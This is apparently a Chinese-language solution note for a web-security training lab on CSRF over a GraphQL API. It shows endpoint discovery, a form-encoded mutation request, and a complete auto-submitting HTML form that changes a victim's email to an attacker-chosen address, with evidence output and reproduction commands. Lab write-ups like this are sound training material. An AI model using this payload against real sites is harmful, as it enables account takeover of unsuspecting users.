---
title: "lab-graphql-csrf-via-graphql-api"
links:
  - target: graphql-family
    relation: evidences
  - target: csrf-family
    relation: evidences
---

# lab-graphql-csrf-via-graphql-api

> evidences: [[graphql-family]], [[csrf-family]]

- 题面:Performing CSRF exploits over GraphQL(/web-security/graphql/lab-graphql-csrf-via-graphql-api)
- 实例:https://0ad0000803399c6d81997a950075001f.web-security-academy.net(exploit 0a3c000b032d9ce5818b7948012b004d)
- 判定目标:用 HTML 表单对 GraphQL 端点做 CSRF,改掉 viewer 邮箱;状态:**solved**(exploit server banner 直接翻 is-solved)

## 关键步

1. 端点与操作:**不是** `/graphql`(404)→ 读页面脚本得 `/graphql/v1`:
   登录页载 `/resources/js/gqlUtil.js`(sendQuery → fetch `/graphql/v1`)与 `loginGql.js`;
   `/my-account` 载 `changeEmailGql.js`,给出 mutation 形状:
   `mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }`,variables `{input:{email}}`。
2. **表单编码面**:`POST /graphql/v1` + `Content-Type: application/x-www-form-urlencoded` +
   body `query=mutation changeEmail { changeEmail(input:{email:"x@y"}) { email } }`(变量内联)→ 200 且回显新邮箱。
3. CSRF 页(exploit server,`formAction=DELIVER_TO_VICTIM --follow`):
   `<form action="https://<inst>/graphql/v1" method="POST"><input type=hidden name=query value='mutation changeEmail { changeEmail(input:{email:"pwned@evil.net"}) { email } }'></form><script>document.forms[0].submit()</script>`
   (属性单引号包 mutation,内层用双引号)→ victim 自动提交 → 其邮箱被改 → 翻。

## 证据摘录

```
lab_http post "<inst>/graphql/v1" --header 'Content-Type: application/x-www-form-urlencoded' \
  --body 'query=mutation changeEmail { changeEmail(input:{email:%22wiener2@evil.net%22}) { email } }'
 -> {"data":{"changeEmail":{"email":"wiener2@evil.net"}}}
# 投递后 exploit server 回包头部已带 <section class='academyLabBanner is-solved'>
solved_check "<inst>/" --jar /tmp/b24-jar4.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch EE2C12983456A4312F8435C1FFB0292D55C10E35DD899DE6FB8BB3560257EF75 --widget-source /web-security/graphql --jar /tmp/b24-jar4.json
# 登 wiener:POST /graphql/v1 JSON {"query":"mutation login($input: LoginInput!){login(input:$input){token success}}","variables":{"input":{"username":"wiener","password":"peter"}}}
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<CSRF 表单页>' --form formAction=DELIVER_TO_VICTIM --follow
```
